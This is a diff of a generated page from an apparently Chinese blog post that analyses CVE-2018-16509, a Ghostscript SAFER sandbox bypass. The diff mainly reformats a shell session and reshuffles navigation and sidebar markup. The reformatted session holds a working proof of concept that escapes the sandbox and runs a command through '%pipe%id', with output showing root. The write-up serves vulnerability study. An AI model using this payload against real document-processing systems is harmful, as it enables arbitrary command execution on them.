@@ -216,7 +216,7 @@
 <p>这里我们在#2处下断，观察到了解释器处理stopped、null、restore等关键字的过程，至此SAFER沙箱如何被绕的过程就逐渐清晰了。<br><img src="https://image.3001.net/images/20180824/1535102928_5b7fcfd0d7ab5.png" alt="绕过SAFER沙箱过程"></p>
 <p><img src="https://image.3001.net/images/20180824/1535102953_5b7fcfe9273b2.png" alt="绕过SAFER沙箱过程"></p>
 <p><img src="https://image.3001.net/images/20180824/1535103001_5b7fd01996188.png" alt="绕过SAFER沙箱过程"></p>
-<h3 id="2-4-探究漏洞成因"><a href="#2-4-探究漏洞成因" class="headerlink" title="2.4 探究漏洞成因"></a>2.4 探究漏洞成因</h3><p>完整过程如下：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> gs -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null </span></span><br><span class="line"><span class="hljs-meta">GS&gt;</span><span class="hljs-bash">legal</span></span><br><span class="line"><span class="hljs-meta">GS&gt;</span><span class="hljs-bash">&#123; null restore &#125; stopped &#123; pop &#125; <span class="hljs-keyword">if</span></span></span><br><span class="line"><span class="hljs-meta">GS&gt;</span><span class="hljs-bash">legal</span></span><br><span class="line"><span class="hljs-meta">GS&gt;</span><span class="hljs-bash">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span></span><br><span class="line">GS&lt;1&gt;showpage</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p>
+<h3 id="2-4-探究漏洞成因"><a href="#2-4-探究漏洞成因" class="headerlink" title="2.4 探究漏洞成因"></a>2.4 探究漏洞成因</h3><p>完整过程如下：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span> gs -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null </span><br><span class="line"><span class="hljs-meta">GS&gt;</span>legal</span><br><span class="line"><span class="hljs-meta">GS&gt;</span>&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line"><span class="hljs-meta">GS&gt;</span>legal</span><br><span class="line"><span class="hljs-meta">GS&gt;</span>mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br><span class="line">GS&lt;1&gt;showpage</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p>
 <p>经过上面的分析我们可以知道简单的一条<code>{null restore} stopped {pop} if</code>就能绕过SAFER沙箱，但其原理又是什么呢？</p>
 <p>PostScript是一种“逆波兰式”（Reverse Polish Notation，也称为后缀表达式）的语言。简单来说就是操作数在前，操作符在后。PoC中这条语句是一条典型的PostScript异常处理语句，stopped操作符用于PostScript的异常处理，也就是说stopped执行前面的{}中给出的过程，如果解释器在执行该过程期间出现错误，它将终止该过程并执行stopped操作符之后{}中的过程。</p>
 <p><code>null restore</code>会引起类型检查错误（/typecheck error），同时restore的执行导致LockSafetyParams设置为False，stopped捕获到异常，弹出栈顶元素null，GS继续运行，但此时LockSafetyParams的值还没恢复为True。<br><img src="https://image.3001.net/images/20180824/1535103061_5b7fd05552e72.png" alt></p>
@@ -259,56 +259,15 @@
 
 
 
-<div class="card">
-    <div class="card-content">
-        <h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3>
-        <div class="buttons is-centered">
-            
-                
-<div class="notification is-danger">
-    You forgot to set the <code>qrcode</code> for Alipay. Please set it in <code>_config.yml</code>.
-</div>
-
-                
-                
-<div class="notification is-danger">
-    You forgot to set the <code>qrcode</code> for Wechat. Please set it in <code>_config.yml</code>.
-</div>
-
-                
-                <!-- Visit https://www.paypal.com/donate/buttons/ to get your donate button -->
-
-<div class="notification is-danger">
-    You forgot to set the <code>business</code> and <code>currency_code</code> for Paypal. Please set it in <code>_config.yml</code>.
-</div>
-
-                
-                
-<div class="notification is-danger">
-    You forgot to set the <code>url</code> Patreon. Please set it in <code>_config.yml</code>.
-</div>
-
-                
-        </div>
-    </div>
-</div>
-
 
 
 <div class="card card-transparent">
     <div class="level post-navigation is-flex-wrap is-mobile">
         
-        <div class="level-start">
-            <a class="level level-item has-link-grey  article-nav-prev" href="/2019/07/03/hello-world/">
-                <i class="level-item fas fa-chevron-left"></i>
-                <span class="level-item">Hello World</span>
-            </a>
-        </div>
-        
         
         <div class="level-end">
-            <a class="level level-item has-link-grey  article-nav-next" href="/2018/11/16/Bypassing Canary——SSP Leak/">
-                <span class="level-item">Bypassing Canary——SSP Leak</span>
+            <a class="level level-item has-link-grey  article-nav-next" href="/2019/07/03/hello-world/">
+                <span class="level-item">Hello World</span>
                 <i class="level-item fas fa-chevron-right"></i>
             </a>
         </div>
@@ -528,25 +487,6 @@
         
         <article class="media">
             
-            <a href="/2019/07/03/hello-world/" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Hello World">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-07-03T15:55:26.000Z">2019-07-03</time></div>
-                    <a href="/2019/07/03/hello-world/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Hello World</a>
-                    <p class="is-size-7 is-uppercase">
-                        
-                    </p>
-                </div>
-            </div>
-        </article>
-        
-        <article class="media">
-            
             <a href="/2019/07/03/ghostscrpt/" class="media-left">
                 <p class="image is-64x64">
                     <img class="thumbnail" src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/Ghostscript-1.png" alt="CVE-2018-16509：Ghostscrpt沙箱绕过漏洞">
@@ -559,6 +499,25 @@
                     <a href="/2019/07/03/ghostscrpt/" class="title has-link-black-ter is-size-6 has-text-weight-normal">CVE-2018-16509：Ghostscrpt沙箱绕过漏洞</a>
                     <p class="is-size-7 is-uppercase">
                         <a class="has-link-grey -link" href="/categories/漏洞分析/">漏洞分析</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/07/03/hello-world/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Hello World">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-07-03T15:55:26.000Z">2019-07-03</time></div>
+                    <a href="/2019/07/03/hello-world/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Hello World</a>
+                    <p class="is-size-7 is-uppercase">
+                        
                     </p>
                 </div>
             </div>
@@ -833,25 +792,6 @@
         
         <article class="media">
             
-            <a href="/2019/07/03/hello-world/" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Hello World">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-07-03T15:55:26.000Z">2019-07-03</time></div>
-                    <a href="/2019/07/03/hello-world/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Hello World</a>
-                    <p class="is-size-7 is-uppercase">
-                        
-                    </p>
-                </div>
-            </div>
-        </article>
-        
-        <article class="media">
-            
             <a href="/2019/07/03/ghostscrpt/" class="media-left">
                 <p class="image is-64x64">
                     <img class="thumbnail" src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/Ghostscript-1.png" alt="CVE-2018-16509：Ghostscrpt沙箱绕过漏洞">
@@ -864,6 +804,25 @@
                     <a href="/2019/07/03/ghostscrpt/" class="title has-link-black-ter is-size-6 has-text-weight-normal">CVE-2018-16509：Ghostscrpt沙箱绕过漏洞</a>
                     <p class="is-size-7 is-uppercase">
                         <a class="has-link-grey -link" href="/categories/漏洞分析/">漏洞分析</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/07/03/hello-world/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Hello World">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-07-03T15:55:26.000Z">2019-07-03</time></div>
+                    <a href="/2019/07/03/hello-world/" class="title has-link-black-ter is-size-6 has-text-weight-normal">Hello World</a>
+                    <p class="is-size-7 is-uppercase">
+                        
                     </p>
                 </div>
             </div>
